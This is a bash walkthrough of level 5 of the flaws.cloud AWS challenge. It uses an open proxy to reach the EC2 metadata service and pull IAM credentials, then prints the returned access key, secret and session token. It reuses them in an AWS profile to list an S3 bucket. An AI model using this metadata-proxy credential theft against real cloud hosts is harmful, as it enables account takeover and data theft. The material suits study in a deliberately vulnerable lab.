#!/bin/bash
# http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
curl http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/

# http://169.254.169.254/latest/meta-data/ 
# follow that tree down to 

curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
:'{
  "Code" : "Success",
  "LastUpdated" : "2020-12-29T16:42:49Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQG4XECLQIV",
  "SecretAccessKey" : "RFyGu6bqurVCzss8Wire/DpdpaQnOeDaOA4xtUQG",
  "Token" : "IQoJb3JpZ2luX2VjEKn//////////wEaCXVzLXdlc3QtMiJHMEUCIQDB+d8R9ve8lbgpUoYoUxklVNXhvutMZLGK3sSPrp3XFgIgPHBsEk395uD8ormlLJy3RneNSFqCCNazz0c9WEkgvBIqtAMIYhABGgw5NzU0MjYyNjIwMjkiDLWSKgG6yNdrlV3fCiqRA9/9ZjFSy9Q7GA3/hlATJZwjBOylUPuH1KOQ12ACNpQGWYeCEwWjEyohz8wzniTzkbmzYeb2GT0akdTLRfi973koGeSDPNw9AepFAO78uzJ5Hf17Whx+barxo0g684zcQkZozGhU9358DKml9Nv1R0Wss01uGycJbdU2sRIUUj6xnkVqVPUeTjSLXUK5ENL7tVG1IgvQd4x20FYie14aj6PIyu24CUmuUEF/NWEDnTIu/AlPxdGZt5Othh3aPDkZCVCrcWp3oZl319X16XZ8l8nf7RuuEupEuS5ib5NuDLZMseQvkV2OVMKgQX+Jv9gNGiTLrTCz/R8o6uPQnXpZ90FDEOkpGx7tdRQU8dDDGiDLr/AH6UmhgnqLJk3jwtoT5AlAPG/O8rsIpWHvm+UlcWNYYJuffYPiKQcAKiSyZQLDySnEdTusQeLyyqwpgIU0Wsw/pKQw6gfmtihCi5bNfCIBzZnCGUdevxJpgolR+zZ0DSQO5bhPBfrj7dSKtIUfUTm48NbLACkkPXE2v0YtvBOvML25rf8FOusB7mlPvEojf4bjdph+rFtNGPC65gvuBknTtjNqRiIXw5TuZ5l/I/xNPjoKm0VTXtTnkwiTYews/W/7UILmysZ0ldBmP2Mzk7yJECGS84jMlsSJpSsh4nUo4dKw3dVu76Sje0EdatGGcPK7qckNAxJLh+wBwFnHbOUL9OOltPZ/wA7+NLDPJlGLou8oESUIk0KuNLNRqisVKiJ3md9EExHew5QR/mZP8Y652ORfwNbwfdADadar0UhBZOQmkLXAHyfNumU2DSw1NFxmg0Pahht3uxKJ3zJkLwNbnwU+a4OzhjdqpaOv5WNkASdS5g==",
  "Expiration" : "2020-12-29T22:56:21Z"
}% '

# also found http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

# make new aws profile for level5
aws configure --profile flawsL5

aws --profile flawsL5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
:'PRE ddcc78ff/
2017-02-27 02:11:07        871 index.html'

#found next level
# ddcc78ff/
curl level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/